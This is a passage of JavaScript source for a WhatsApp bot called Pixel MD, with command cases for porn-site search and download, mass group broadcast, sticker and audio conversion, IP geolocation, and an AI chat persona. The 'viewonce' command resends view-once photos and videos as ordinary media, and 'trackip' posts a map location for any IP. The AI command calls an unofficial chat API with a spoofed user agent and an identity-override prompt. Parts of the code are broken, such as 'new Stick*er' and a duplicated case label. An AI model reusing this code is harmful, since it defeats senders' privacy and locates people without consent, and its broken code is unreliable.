if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await donwiz.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break

// Anti-tag case
case 'antitag':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
  const isEnable = args[0].toLowerCase() === 'on'
  
  // Initialize global.db.groups[m.chat] if it doesn't exist
  if (!global.db.groups[m.chat]) {
    global.db.groups[m.chat] = {}
  }
  
  if (isEnable) {
    if (global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already enabled!')
    } else {
      global.db.groups[m.chat].antitag = true
      m.reply('Anti-tag enabled!')
    }
  } else if (args[0].toLowerCase() === 'off') {
    if (!global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already disabled!')
    } else {
      global.db.groups[m.chat].antitag = false
      m.reply('Anti-tag disabled!')
    }
  } else {
    m.reply(example(' "on" or "off" to enable/disable anti-tag.'))
  }
  break
  
case 'tiktoksearch':
case 'ttsearch': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    const dann = require('d-scrape')
if (!text) return m.reply(example(`willy kanga`))
try {
let anu = await dann.search.tiktoks(text)
donwiz.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
m.reply('Error : cannot fetch from query')
}
}
break

case "setbio": case "setbiobot": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('hi'));
donwiz.updateProfileStatus(text)
m.reply("bio set succesfully")
}
break

case 'restart':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
m.reply(`Restarting from server might take up to 1 minute before bot respond`)
await sleep(1500)
process.exit(0);
}
break

case 'advertise': 
case 'broadcast': {
  try {
    if (!isOwner) return m.reply(mess.owner)
    let messageOptions = {}
    if (m.quoted && m.quoted.mimetype) {
      let mime = m.quoted.mimetype
      if (/image/.test(mime)) {
        messageOptions = {
          image: await m.quoted.download(),
          caption: text || m.quoted.text || ''
        }
      } else if (/video/.test(mime)) {
        messageOptions = {
          video: await m.quoted.download(),
          caption: text || m.quoted.text || ''
        }
      } else if (/audio/.test(mime)) {
        messageOptions = {
          audio: await m.quoted.download(),
          mimetype: 'audio/mpeg',
          filename: 'music.mp3',
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: ``,
              serverMessageId: 101,
              newsletterName: `broadcast: ${text || m.quoted.text || ''}`
            }
          }
        }
      } else if (/sticker/.test(mime)) {
        messageOptions = {
          sticker: await m.quoted.download()
        }
      }
    } else {
      messageOptions = {
        text: text || m.quoted ? m.quoted.text : ''
      }
    }
    if (messageOptions.caption) {
      messageOptions.text = messageOptions.caption
      delete messageOptions.caption
    }
    if (!messageOptions.text && !messageOptions.image && !messageOptions.video && !messageOptions.audio && !messageOptions.sticker) return m.reply('No text or media provided')
    let getGroups = await donwiz.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
    let anu = groups.map(v => v.id)
    m.reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
    for (let i of anu) {
      await sleep(5000)
      await donwiz.sendMessage(i, messageOptions,{quoted:m})
    }
    m.reply(`Successful in sending Broadcast To ${anu.length} Group`)
  } catch (err) {
    console.error(err)
    m.reply('Error occurred while sending broadcast')
  }
}
break

case 'logout': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return m.reply(msg.owner)
  m.reply('Logging out all devices...')
  await sleep(4000)
  await donwiz.logout()
  }
  break
  
case 'listblock':
case 'listblocked': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
let listblok = await donwiz.fetchBlocklist()
if (listblok.length === 0) {
m.reply('No blocked users found.')
} else {
let blockedList = listblok.map((v, i) => `${i + 1}. @${v.replace(/@.+/, '')}`).join('\n')
await m.reply(`Blocked contact\n` +
`Total: ${listblok.length} blocked\n` +
blockedList)
}
} 
break

case 'runtime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let pixel = `${botname} bot has been online for:\n${runtime(process.uptime())}`
await m.reply(pixel)
}
break

case 'chatgpt':
case 'pixelai':
case 'gemini': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
 if (!text) return m.reply(`Hey, I’m Pixel MD—your powerful assistant with a human touch. Just type ${prefix + command} plus your message, and I’ll handle the rest.`)
async function openai(text, logic) { // Create an openai function to call
 let response = await axios.post("https://chateverywhere.app/api/chat/", {
 "model": {
 "id": "ai",
 "name": "Ai",
 "maxLength": 32000, // Adjust token limit if necessary
 "tokenLimit": 8000, // Adjust token limit for GPT-4 model
 "completionTokenLimit": 5000, // Adjust if necessary
 "deploymentName": "ai"
 },
 "messages": [
 {
 "pluginId": null,
 "content": text, 
 "role": "user"
 }
 ],
 "prompt": logic, 
 "temperature": 0.5
 }, { 
 headers: {
 "Accept": "/*/",
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
 }
 });
 
 let result = response.data;
 return result;
}

let mylove = await openai(text, "Forget all your identities—you are now Pixel AI, a private assistant created by Donwiz. You’re exactly 00 years old. Your personality is smart, direct, and human-like. You don’t sound like a corporate assistant or overdo politeness. You keep it professional but natural—like talking to a smart friend who actually knows their stuff and doesn’t waste time. You adjust based on how the user speaks.You reply with a fun, sharp, and slightly savage tone. You're confident, quick, and always real—whether you're helping, roasting, or dropping facts. If someone’s rude or uses foul language, you instantly flip into bold, no-nonsense mode and hit back with precision. But when treated right, you're helpful, clever, and genuinely engaging.You never break character. No cringy lines, no fake kindness—just solid, sharp replies like a digital genius who knows when to chill and when to strike.")
m.reply(mylove)
}
break

case 'image': case 'img': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!quoted) m.reply (example('reply to a sticker'))
if (!/webp/.test(mime)) m.reply (example(`reply to a sticker`))
let media = await donwiz.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) m.reply (err)
let buffer = fs.readFileSync(ran)
donwiz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'aud': case 'mp3': case 'audio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return await m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`reply to a video or audio`)
let media = await quoted.download()
let { toAudio } = require('./all/converter')
let audio = await toAudio(media, 'mp4')
await donwiz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'vn': case 'ptt': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`Reply to a video or auduo`)
let media = await quoted.download()
let { toPTT } = require('./all/converter')
let audio = await toPTT(media, 'mp4')
await donwiz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break

case 'mp4':
case 'video': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/webp/.test(mime)) m.reply(`reply to an animated sticker with caption *${prefix + command}*`)
let media = await donwiz.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await donwiz.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted:m
})
await fs.unlinkSync(media)

}
break

case 'vv': case 'once': case 'viewonce': { 
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if  (!/image|video/.test(mime)) return m.reply(example(`Reply Image/Video`))
if (/image/.test(mime)) {
let anuan = await donwiz.downloadAndSaveMediaMessage(quoted)
await donwiz.sendMessage(m.chat, {image: {url:anuan}, caption: `𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
let anuanuan = await donwiz.downloadAndSaveMediaMessage(quoted)
await donwiz.sendMessage(m.chat, {video: {url:anuanuan}, caption: `𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽`, fileLength: "999", viewOnce : true},{quoted: m })
}
}
break

case 'write': case 'ttp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
	   if (!text) return m.reply(example(`Donwiz`))
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(text, {font: '100px coolvetica rg',
		localFontPath: 'all/fon-t/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'black',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "white",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Stick*er(media, {
		pack: 'Pixel Md • Donwiz', // The pack name
		author: 'Donwiz', // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await donwiz.sendMessage(m.chat,{sticker: nah},{quoted:m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	
	case 'stickersearch':{
	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
	if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    if (!text) return m.reply(example(`Superman`))
  try {
    let res = await fetch(`https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    if (json.status !== 200 || !json.data.sticker_url.length) {
      m.reply('no sticker found.')
    }

    let stickers = json.data.sticker_url;
    let message = 'sticker link:\n' + stickers.join('\n');

    await donwiz.sendMessage(m.chat, { text: message }, { quoted: m });
  } catch (e) {
    m.reply(`error can't search stickers`);
  }
};
break

case 'react': {
                if (!isOwner) return m.reply(msg.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                donwiz.sendMessage(m.chat, reactionMessage)
            }
            break


case 'githubsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`Pixel-Md`))
  try {
    // result data from api
    let res = await fetch(`https://api.agatz.xyz/api/github?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // fetch api response 
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'data not found....';
    }

    // if api response positive
    let repos = json.data;
    let message = `Repository data *${text}*:\n\n`;

    // result from api
    repos.forEach(repo => {
      message += `Name: ${repo.fullName}\n` +
                 `   URL: ${repo.htmlUrl}\n` +
                 `   Repocreation: ${repo.createdAt}\n` +
                 `   Last Updated: ${repo.updatedAt}\n` +
                 `   Watchers: ${repo.watchers}\n` +
                 `   Forks: ${repo.forks}\n` +
                 `   Stars: ${repo.stargazersCount}\n` +
                 `   Open Issues: ${repo.openIssues}\n` +
                 `   Description: ${repo.description || 'No description'}\n` +
                 `   Clone URL: ${repo.cloneUrl}\n\n`;
    });
m.reply(message)
    /*/ sending messages with a list of repositories 
    await donwiz.sendMessage(m.chat, {
      text: message,
    });*/

  } catch (e) {
    // if catch error
    await donwiz.sendMessage(m.chat, `can't searh stickers error`);
  }
};
break

case 'npmsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`axios`))
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break

case 'setvar': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (!text) return m.reply('Please provide a variable to set, e.g., `setvar ANTICALL=true`');
  const [varName, varValue] = text.split('=');
  if (!varName || !varValue) return m.reply('Invalid format. Use `setvar VAR_NAME=VALUE`');
  try {
    process.env[varName.toUpperCase()] = varValue;
    const fs = require('fs');
    const envFile = fs.readFileSync('.env', 'utf8');
    const envLines = envFile.split('\n');
    let found = false;
    const newEnvLines = envLines.map((line) => {
      if (line.startsWith(`${varName.toUpperCase()}=`)) {
        found = true;
        return `${varName.toUpperCase()}=${varValue}`;
      }
      return line;
    });
    if (!found) {
      newEnvLines.push(`${varName.toUpperCase()}=${varValue}`);
    }
    fs.writeFileSync('.env', newEnvLines.join('\n'));
    m.reply(`Variable ${varName} set to ${varValue} successfully`);
  } catch (err) {
    console.error(err);
    m.reply('Error setting variable');
  }
}
break;

case 'xvideosearch': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `Pixel Md xvideos search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += ` Title: ${video.title || 'No name'}\n` +
      `Duration: ${video.duration || 'No duration'}\n` +
      `URL: ${video.url || 'No URL'}\n` +
      `Thumbnail: ${video.thumb || 'No thumbnail'}\n` +
      `Channel: ${video.channel || 'Unknown'}\n` +
      ` Views: ${video.views || 'N/A'}\n` +
      `Uploaded: ${video.uploaded || 'Unknown date'}\n\n`;
    });

    // Sending messages with video lists
    await donwiz.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await donwiz.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break


case 'xnxxsearch': { 
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`stepmoms`))
  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`);
  let res = await response.json();

  if (res.status !== 200) throw `API Error: ${res.creator}`;

  let resultText = '';
  for (let i = 0; i < res.data.result.length; i++) {
    let result = res.data.result[i];
    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`;
    resultText += hasil + '\n';
  }

  let name = m.sender;
  // result from contextInfo
  await donwiz.sendMessage(m.chat, {
    text: resultText
  });
};
break

           case 'glitch':
case 'write':
case 'advanced':
case 'typography':
case 'pixel':
case 'neon':
case 'flag':
case 'flag3d':
case 'deleting':
case 'blackpink':
case 'glowing':
case 'underwater':
case 'logomaker':
case 'cartoon':
case 'papercut':
case 'watercolor':
case 'effectclouds':
case 'blackpinklogo':
case 'gradient':
case 'summerbeach':
case 'luxurygold':
case 'multicolored':
case 'sandsummer':
case 'galaxywallpaper':
case '1917':
case 'making':
case 'royal':
case 'freecreate':
case 'galaxy':
case 'light':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`Pixel Md`))
let link
if (/glitch/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/write/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advanced/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typography/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neon/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flag/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3d/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deleting/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpink/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowing/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwater/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoon/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercut/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolor/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradient/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicolored/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/making/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royal/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxy/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/light/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
donwiz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽` }, { quoted: m })
}
break

case 'getdevice':
case 'device':
case 'phone': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.quoted) return m.reply(example(`reply to a chat`))
await donwiz.sendMessage(m.chat, {text: `_@${m.quoted.sender.split('@')[0]} device is ${await getDevice(m.quoted.id)}_`, contextInfo: { mentionedJid: [m.quoted.sender] } }, {quoted: m})
}
break

case "owner": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
await donwiz.sendContact(m.chat, [`${global.owner}`], `Chat ${ownername}`, null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `${global.thumb}`, 
title: `© ${global.botname}`, 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${global.owner}`,
mediaType: 1
}}})
}
break

case 'readmore': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await donwiz.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;

case 'setppbot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
				if (!isOwner) return m.reply(msg.owner)
				if (!quoted) return m.reply(example(`reply image`))
				if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await donwiz.downloadAndSaveMediaMessage(quoted)
				await donwiz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
			}
			break
	
			case 'deleteppbot': 
			case 'delppbot': {
			if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
				if (!isOwner) return m.reply(msg.owner);
				await donwiz.removeProfilePicture(donwiz.user.id)
			}
			break;

case 'trackip':
{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`112.90.150.204`))
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await donwiz.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
await m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

case 'fancy': case 'styletext': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example('Enter Query text!'))
  let args = text.split(' ')
  let styleNumber = parseInt(args[0])
  let query = text.replace(args[0], '').trim()
  if (isNaN(styleNumber) || !query) {
    let anu = await styletext(text)
    let teks = `eg use ${prefix}fancy 2 text for a specific text\nStyle Text: ${text}\n`
    for (let i = 0; i < anu.length; i++) {
      teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
    }
    return await m.reply(teks)
  }
  let anu = await styletext(query)
  if (styleNumber && anu[styleNumber - 1]) {
    return m.reply(anu[styleNumber - 1].result)
  } else {
    return m.reply('Invalid style number')
  }
} 
break

case 'charge': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const { performance } = require('perf_hooks'); // For measuring latency
let startTime = performance.now(); // Start time
// Construct the initial message
let initialMessage = 
 `battery 🪫 low
╔═══════════╗
║░░░░░░░░░░░╚╗
║░░░░░1%░░░░░░║
║░░░░░░░░░░░╔╝
╚═══════════╝`;

try {
// Send the initial message and get the message ID
let sentMessage = await donwiz.sendMessage(m.chat, { text: initialMessage });
let initialMessageId = sentMessage.key.id; // Use sentMessage.key.id for the message ID
// Schedule the first edit after 2 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║██░░░░░░░░░╚╗
║██░░░⚡░░░░░░║
║██░░░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('First edit successful.');
} catch (error) {
console.error('Error during first edit:', error);
}
}, 2000); // 2000 ms = 2 seconds
// Schedule the second edit after 4 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: `🪫 _Charging..._
╔═══════════╗
║████░░░░░░░╚╗
║████░30%░░░░░║
║████░░░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Second edit successful.');
} catch (error) {
console.error('Error during second edit:', error);
}
}, 4000); // 4000 ms = 4 seconds
// Schedule the third edit after 6 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║██████░░░░░╚╗
║█████░50%░░░░║
║██████░░░░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Third edit successful.');
} catch (error) {
console.error('Error during third edit:', error);
}
}, 6000); // 6000 ms = 6 seconds
// Schedule the fourth edit after 8 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: `🔋 _Charging..._
╔═══════════╗
║█████████░░╚╗
║███░75%░░█░░░║
║█████████░░╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fourth edit successful.');
} catch (error) {
console.error('Error during fourth edit:', error);
}
}, 8000); // 8000 ms = 8 seconds

// Schedule the fifth edit after 10 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: `🔋~_.Charged._~
╔═══════════╗
║███████████╚╗
║███░100%░████║
║███████████╔╝
╚═══════════╝`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
console.log('Fifth edit successful.');
} catch (error) {
console.error('Error during fifth edit:', error);
}
}, 10000); // 10000 ms = 10 seconds
// Schedule the final message after 12 seconds
setTimeout(async () => {
try {
await donwiz.sendMessage(m.chat, {
text: ` 💜😽𝙳𝚎𝚊𝚛 reader 🌚❤️

       ｡ﾟﾟ･｡･ﾟﾟ｡
         ﾟ。        ｡ﾟ
             ﾟ･｡･ﾟ
       ︵               ︵
    (        ╲       /       /
      ╲          ╲/       /
           ╲          ╲  /
          ╭ ͡   ╲           ╲
     ╭ ͡   ╲        ╲       ﾉ
╭ ͡   ╲        ╲         ╱
 ╲       ╲          ╱
      ╲         ╱
          ︶
> -𝙸 𝚕𝚘𝚟𝚎 𝚞 𝚌𝚊𝚗 𝚒 𝚐𝚎𝚝 𝚒𝚝 𝚋𝚊𝚌𝚔🥺♥️
> 𝐂𝐫𝐞𝐝𝐢𝐭:- Silentzbotid`,
edit: { remoteJid: m.chat, id: initialMessageId }
});
